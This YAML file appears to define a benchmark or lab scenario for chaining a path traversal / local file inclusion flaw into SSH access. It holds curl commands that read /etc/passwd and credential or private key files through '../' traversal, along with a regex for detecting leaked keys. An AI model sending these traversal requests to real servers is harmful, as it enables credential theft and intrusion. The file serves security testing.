id: lfi_to_rce
description: >
  Use a path traversal / local file inclusion vulnerability to read a sensitive
  file on the server (SSH private key, credentials file, or application config)
  that enables a subsequent shell login or privilege escalation.
compatible_vuln_patterns:
  - path_traversal_lfi
success_criteria:
  description: >
    The attacker's traversal request returns the contents of a sensitive file —
    an SSH private key (BEGIN ... PRIVATE KEY), a credentials file, or /etc/shadow
    entries — that can be used to gain OS access.
  output_pattern: 'BEGIN.*PRIVATE KEY|BEGIN.*RSA|root:|[a-zA-Z0-9_-]+:[^:]+:[0-9]'
test_template: |
  # Read /etc/passwd to confirm traversal works
  curl -s "http://target:{{port}}/{{endpoint}}?{{input_parameter}}=../../../../etc/passwd" \
    | grep "root:"
  # Read the target credential file
  curl -s "http://target:{{port}}/{{endpoint}}?{{input_parameter}}=../../../../{{credential_path}}" \
    | grep -E 'PRIVATE KEY|password|BEGIN'
notes: >
  The "RCE" is achieved post-traversal via SSH using stolen credentials or a
  private key. The synthesis_context should specify which file the traversal
  exposes (SSH key at /home/<user>/.ssh/id_rsa, or a credentials.txt). The
  file must be readable by the web server process (www-data or equivalent).
